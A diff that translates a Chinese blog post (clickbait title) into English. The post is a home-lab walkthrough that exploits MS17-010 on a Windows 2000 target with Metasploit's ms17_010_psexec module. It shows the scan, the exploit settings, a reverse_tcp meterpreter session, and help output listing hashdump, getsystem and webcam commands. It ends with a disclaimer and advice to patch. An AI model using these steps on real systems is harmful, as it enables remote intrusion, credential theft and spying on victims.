@@ -1,49 +1,50 @@
-# 震惊！16岁男子竟然在家里做出这种事！
+# Shock! A 16-Year-Old Boy Did This at Home!
 
 
-## 简介
+<!--more-->
+## Introduction
 
-该男子居然在家做出这种事情，使多数人震惊！
-## 这才是真正的简介
+This boy actually did such a thing at home, shocking everyone!
 
-哈哈，上面那个是假的，本篇博客将会复现MS17-010漏洞攻击。
+## Real Introduction
 
-### MS17-010是啥啊？
+Haha, the above was fake. This blog post will reproduce the MS17-010 vulnerability attack.
 
-你是否记得2017年的那个勒索病毒？就是不给钱就把你电脑里所有的AV加密起来的一个病毒。是不是很可怕？这个病毒就是通过这个漏洞让更多的人看不到AV的。
+### What is MS17-010?
 
-* 那这个漏洞是怎样的呢？我将给出以下链接用于参考：
+Do you remember the ransomware from 2017? The virus that encrypted all files on your computer if you didn't pay up? That virus spread through this vulnerability.
+
+* Here are some reference links about this vulnerability:
+
+> [Microsoft Security Bulletin MS17-010 - Critical](https://docs.microsoft.com/en-us/security-updates/Securitybulletins/2017/ms17-010)
 >
-> [Microsoft 安全公告 MS17-010 - 严重](https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010)
+> [CVE-2017-0143](https://cvedetails.com/cve/CVE-2017-0143/)
 >
-> [https://cvedetails.com/cve/CVE-2017-0143/](https://cvedetails.com/cve/CVE-2017-0143/)
+> [CVE-2017-0144](https://cvedetails.com/cve/CVE-2017-0144/)
 >
-> [https://cvedetails.com/cve/CVE-2017-0144/](https://cvedetails.com/cve/CVE-2017-0144/)
+> [CVE-2017-0145](https://cvedetails.com/cve/CVE-2017-0145/)
 >
-> [https://cvedetails.com/cve/CVE-2017-0145/](https://cvedetails.com/cve/CVE-2017-0145/)
+> [CVE-2017-0146](https://cvedetails.com/cve/CVE-2017-0146/)
 >
-> [https://cvedetails.com/cve/CVE-2017-0146/](https://cvedetails.com/cve/CVE-2017-0146/)
+> [CVE-2017-0147](https://cvedetails.com/cve/CVE-2017-0147/)
 >
-> [https://cvedetails.com/cve/CVE-2017-0147/](https://cvedetails.com/cve/CVE-2017-0147/)
+> [CVE-2017-0148](https://cvedetails.com/cve/CVE-2017-0148/)
 >
-> [https://cvedetails.com/cve/CVE-2017-0148/](https://cvedetails.com/cve/CVE-2017-0148/)
->
-> [https://github.com/RiskSense-Ops/MS17-010](https://github.com/RiskSense-Ops/MS17-010)
->
+> [MS17-010 GitHub](https://github.com/RiskSense-Ops/MS17-010)
 
-## 攻击复现
+## Attack Reproduction
 
-那么，我们来复现一下这个漏洞的攻击流程吧。在这里，我给大家安利一个[Linux](https://baike.baidu.com/item/linux/27050?fr=aladdin)的渗透测试软件包。叫做**Metasploit**。 它在作为**渗透测试的发行版**中是自带的，如果你用的不是**作为渗透测试的发行版**，那么以下是安装方法：
+Let's reproduce the attack process for this vulnerability. Here, I recommend a [Linux](https://en.wikipedia.org/wiki/Linux) penetration testing software package called **Metasploit**. It comes pre-installed in **penetration testing distributions**. If you're not using one, here's how to install it:
 
-* 基于Arch
+* Arch-based
 ```bash
 $ sudo pacman -S metasploit
 ```
-* 基于Debian更新源里有的
+* Debian-based (if in repos)
 ```bash
 $ sudo apt-get install metasploit
 ```
-* rpm系或deb系源里没有的
+* RPM-based or Debian-based (if not in repos)
 ```bash
 $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
 ```
@@ -51,49 +52,47 @@ $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config
 ```bash
 $ sudo chmod 755 msfinstall && ./msfinstall
 ```
-* Windows嘛….
+* Windows...
 
-> 两个选择
->
->   * 请到[MSF官网](https://www.metasploit.com/)下载，并且耐心等待。
->   * [出门左转](/posts/linux_mint_安装教程/)安装Linux
+> Two choices:
+> * Go to the [MSF website](https://www.metasploit.com/) and download it.
+> * [Turn left](/posts/linux_mint_安装教程/) and install Linux.
 
-## 复现过程
->
-> 重要的事情说三遍：
->
-> 接下来就是最重要的一部分，你一定要认真看！认真看！认真看！
->
+## Reproduction Process
 
-### 攻击环境
-||攻击机|靶机|
+### Attack Environment
+
+| | Attacker | Target |
 |:-:|:-:|:-:|
-|操作系统|Arch Linux|Windows2K|
-|IP地址|192.168.42.141|192.168.42.252|
+| OS | Arch Linux | Windows 2K |
+| IP | 192.168.42.141 | 192.168.42.252 |
 
-靶机截图:
+Target machine screenshot:
 
 ![](/img/截图_2019-07-26_21-57-01.png)
 
-### 攻击过程
+### Attack Process
 
-首先，攻击机打开终端，输入 **`msfconsole`** ，并按回车等待。
+First, open a terminal on the attacker machine and type **`msfconsole`**:
 
 ```bash
 $ sudo msfconsole
 ```
 
-建议加上`sudo`，以免出现未知错误。
+It's recommended to add `sudo` to avoid unknown errors.
 
-稍等片刻，metasploit就打开了。如图
+After a moment, Metasploit will open.
 
 ![](/img/截图_2019-07-26_22-04-07.png)
 
-接下来，通过 **`search`** 命令本次要利用到的MS17_010模块
+Next, use the **`search`** command to find the MS17-010 module we need:
+
 ```bash
 msf5 > search ms17_010
 ```
-然后就跳出一大堆
+
+A list will appear:
+
 ```txt
 Matching Modules
 ================
@@ -106,37 +105,21 @@ Matching Modules
    3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
    4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
 ```
-嘛，我们先检测一下靶机是否存在这个漏洞，选第二个漏洞检测模块。
+
+First, let's check if the target has this vulnerability. Select the second detection module (index 1):
 
 ```bash
 msf5 > use auxiliary/scanner/smb/smb_ms17_010
 ```
 
----
->
->顺便一提，metasploit是一款渗透测试工具，如果你想了解这些模块是怎么运作的，那么你要掌握这几条命令：
->
->1. search
->  * 用于搜素模块，然后列出这个模块使用方式，如上面演示的一样。
->2. info
->  * 显示该模块的详细信息。
->3. show + [option]
->  * 显示该模块的部分信息。
->4. show options
->  * 显示该模块需要设置的项目
->5. show payloads
->  * 显示该模块可使用的攻击载荷
->
->**注意，第三条和第四条不要搞混了，第二条那个[option]是指代。**
->
+Let's check the module info:
 
----
-
-回归正题，我们先看看这个模块的信息。
 ```bash
 msf5 auxiliary(scanner/smb/smb_ms17_010) > info
 ```
-然后又出了一大堆qwq…
+
+This will show a lot of information:
+
 ```txt
     Name: MS17-010 SMB RCE Detection
      Module: auxiliary/scanner/smb/smb_ms17_010
@@ -172,57 +155,48 @@ Description:
   MS17-010 patch. If the machine is missing the MS17-010 patch, the 
   module will check for an existing DoublePulsar (ring 0 
   shellcode/malware) infection. This module does not require valid SMB 
-  credentials in default server configurations. It can log on as the 
-  user "\" and connect to IPC$.
-
-References:
-  https://cvedetails.com/cve/CVE-2017-0143/
-  https://cvedetails.com/cve/CVE-2017-0144/
-  https://cvedetails.com/cve/CVE-2017-0145/
-  https://cvedetails.com/cve/CVE-2017-0146/
-  https://cvedetails.com/cve/CVE-2017-0147/
-  https://cvedetails.com/cve/CVE-2017-0148/
-  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
-  https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
-  https://github.com/countercept/doublepulsar-detection-script
-  https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
-
-Also known as:
-  DOUBLEPULSAR
-  ETERNALBLUE
+  credentials in default server configurations.
 ```
 
-然而这里我们只需要看那个**Basic options**部分就可以了，那两行有yes的，我们就知道了，我们需要指定一个**目标IP(RHOST)**，而那个 **RPORT(目标端口)** 已经被指定为445了。
+From the Basic options, we can see we only need to set **RHOSTS** (the target IP), while **RPORT** (target port) is already set to 445.
 
-接下来执行…
+Set the target IP and run:
+
 ```bash
 msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhost 192.168.42.252
 msf5 auxiliary(scanner/smb/smb_ms17_010) > run
 ```
-返回后我们得到了这些
-```bash 
+
+Result:
+
+```bash
 [+] 192.168.42.252:445    - Host is likely VULNERABLE to MS17-010! - Windows 5.0 x86 (32-bit)
 [*] 192.168.42.252:445    - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
 
 ![](/img/截图_2019-07-26_22-57-39.png)
-说明目标是存在MS17_010漏洞的，那么我们接下来将要使用的是攻击模块，也就是上面搜索到的最后一个。
+
+This confirms the target is vulnerable to MS17-010! Now let's use the exploit module — the last one from the search results:
+
 > exploit/windows/smb/ms17_010_psexec
 
-那么，执行
+Switch to the exploit module:
+
 ```bash
 msf5 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_psexec
 ```
-接下来msf5后面的模块就变成了攻击模块了。
+
+Now the prompt shows it's the exploit module:
+
 ![](/img/截图_2019-07-26_23-01-45.png)
-然后继续执行info，没错，又会弹出一大堆。
+
+Let's view the info:
 
 ```bash
 msf5 exploit(windows/smb/ms17_010_psexec) > info
 ```
 
-对，就是下面这一大堆。
 ```txt
        Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
      Module: exploit/windows/smb/ms17_010_psexec
@@ -247,64 +221,29 @@ Available targets:
   2   Native upload
   3   MOF upload
 
-Check supported:
-  Yes
-
 Basic options:
   Name                  Current Setting                                 Required  Description
   ----                  ---------------                                 --------  -----------
   DBGTRACE              false                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                              yes       How many times to try to leak transaction
-  NAMEDPIPE                                                             no        A named pipe that can be connected to (leave blank for auto)
+  NAMEDPIPE                                                             no        A named pipe that can be connected to
   NAMED_PIPES           /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                yes       The target address range or CIDR identifier
   RPORT                 445                                             yes       The Target port
-  SERVICE_DESCRIPTION                                                   no        Service description to to be used on target for pretty listing
-  SERVICE_DISPLAY_NAME                                                  no        The service display name
-  SERVICE_NAME                                                          no        The service name
-  SHARE                 ADMIN$                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+  SHARE                 ADMIN$                                          yes       The share to connect to
   SMBDomain             .                                               no        The Windows domain to use for authentication
   SMBPass                                                               no        The password for the specified username
   SMBUser                                                               no        The username to authenticate as
-
-Payload information:
-  Space: 3072
-
-Description:
-  This module will exploit SMB with vulnerabilities in MS17-010 to 
-  achieve a write-what-where primitive. This will then be used to 
-  overwrite the connection session information with as an 
-  Administrator session. From there, the normal psexec payload code 
-  execution is done. Exploits a type confusion between Transaction and 
-  WriteAndX requests and a race condition in Transaction requests, as 
-  seen in the EternalRomance, EternalChampion, and EternalSynergy 
-  exploits. This exploit chain is more reliable than the EternalBlue 
-  exploit, but requires a named pipe.
-
-References:
-  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
-  https://cvedetails.com/cve/CVE-2017-0143/
-  https://cvedetails.com/cve/CVE-2017-0146/
-  https://cvedetails.com/cve/CVE-2017-0147/
-  https://github.com/worawit/MS17-010
-  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
-  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
-
-Also known as:
-  ETERNALSYNERGY
-  ETERNALROMANCE
-  ETERNALCHAMPION
-  ETERNALBLUE
 ```
 
-看到这么一大堆，你也不用紧张，其实跟上面的一样，你只需要设置四个东西
+Don't be intimidated by all this information. We just need to set four things:
 
-* RHOST，目标IP，目标的DHCP地址
-*  LHOST，监听IP，一般是你自己的DHCP地址
-* LPORT，监听端口，随便写一个，只要没冲突就行。比如我是Arch Linux，默认全端口关闭，我可以随便写。
-* payload，攻击载荷，一般是 windows/meterpreter/reverse_tcp ，你也可以用别的，想看看还有什么能用就执行 show payloads 吧。
+* RHOSTS — target IP
+* LHOST — our IP (listen IP)
+* LPORT — listen port, any available port
+* payload — attack payload, typically `windows/meterpreter/reverse_tcp`
 
-接下来就设置这四个东西吧。
+Set these parameters:
 
 ```bash
 msf5 exploit(windows/smb/ms17_010_psexec) > set LHOST 192.168.42.141
@@ -319,18 +258,16 @@ msf5 exploit(windows/smb/ms17_010_psexec) > set RHOST 192.168.42.252
 ```
 
 ```bash
-msf5 exploit(windows/smb/ms17_010_psexec) > set payloads windows/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/ms17_010_psexec) > set payload windows/meterpreter/reverse_tcp
 ```
 
-设置完以后执行 **`run`** 或者 **`exploit`** ，其实二者并没有什么区别，都是一样的。
-
-喜欢哪个就用哪个吧。
+Now execute **`run`** or **`exploit`** — they're the same:
 
 ```bash
 msf5 exploit(windows/smb/ms17_010_psexec) > run
 ```
 
-好啦，如果没有问题，然后返回一下内容，那么就说明攻击成功了。
+If everything works, you'll see this output:
 
 ```bash
 [*] Started reverse TCP handler on 192.168.42.141:6666 
@@ -356,18 +293,19 @@ msf5 exploit(windows/smb/ms17_010_psexec) > run
 meterpreter >
 ```
 
-截一张图吧
 ![](/img/截图_2019-07-26_23-12-50.png)
-接下来就可以进行你想干的事情了，而现在干的事情叫做后渗透。后渗透相当复杂，这里就不多讲了。
 
-那么至少可以干点什么呢，执行
+Now you can do whatever you want. What you're doing now is called post-exploitation, which is quite complex, so I won't go into detail here.
+
+At the very least, you can run:
+
 ```bash
 meterpreter > help
 ```
 
-就可以看到帮助文档了。
+To see the help documentation. Here's the meterpreter help output:
 
-```txt
+```
 Core Commands
 =============
 
@@ -406,7 +344,6 @@ Core Commands
     uuid                      Get the UUID for the current session
     write                     Writes data to a channel
 
-
 Stdapi: File system Commands
 ============================
 
@@ -434,7 +371,6 @@ Stdapi: File system Commands
     show_mount    List all mount points/logical drives
     upload        Upload a file or directory
 
-
 Stdapi: Networking Commands
 ===========================
 
@@ -448,7 +384,6 @@ Stdapi: Networking Commands
     portfwd       Forward a local port to a remote service
     resolve       Resolve a set of host names on the target
     route         View and modify the routing table
-
 
 Stdapi: System Commands
 =======================
@@ -477,7 +412,6 @@ Stdapi: System Commands
     suspend       Suspends or resumes a list of processes
     sysinfo       Gets information about the remote system, such as OS
 
-
 Stdapi: User interface Commands
 ===============================
 
@@ -495,7 +429,6 @@ Stdapi: User interface Commands
     setdesktop     Change the meterpreters current desktop
     uictl          Control some of the user interface components
 
-
 Stdapi: Webcam Commands
 =======================
 
@@ -507,15 +440,6 @@ Stdapi: Webcam Commands
     webcam_snap    Take a snapshot from the specified webcam
     webcam_stream  Play a video stream from the specified webcam
 
-
-Stdapi: Audio Output Commands
-=============================
-
-    Command       Description
-    -------       -----------
-    play          play an audio file on target system, nothing written on disk
-
-
 Priv: Elevate Commands
 ======================
 
@@ -523,33 +447,24 @@ Priv: Elevate Commands
     -------       -----------
     getsystem     Attempt to elevate your privilege to that of local system.
 
-
 Priv: Password database Commands
 ================================
 
     Command       Description
     -------       -----------
     hashdump      Dumps the contents of the SAM database
-
-
-Priv: Timestomp Commands
-========================
-
-    Command       Description
-    -------       -----------
-    timestomp     Manipulate file MACE attributes
 ```
 
-嘛，返回来的很多是吧，这几个比较常用
+There's a lot of output. The most commonly used commands are:
 
-**`cd`**、**`ls`**、**`shell`**、**`cat`**
+**`cd`**, **`ls`**, **`shell`**, **`cat`**
 
-懂Linux的人基本上都知道了，这里不多做解释了。
+Most Linux users will already know these, so I won't explain further.
 
-## 小结
+## Summary
 
-首先本篇博客仅作为测试用途，请勿将其用于违法用途。
+First, this blog post is for testing purposes only. Do not use it for illegal activities.
 
-其次，ms17-010这类的漏洞都是十分危险的，Windows用户一定要注意及时更新，打好补丁，不要给坏人可乘之机，最好是干脆直接日用Linux，windows仅用于娱乐即可。
+Second, vulnerabilities like MS17-010 are extremely dangerous. Windows users must update their systems in a timely manner and install patches. Even better, use Linux for daily use and keep Windows only for entertainment.
 
-然后这篇博客也带有很多水的成分，谢谢浏览。
+This blog post also contains lots of fluff. Thanks for reading!
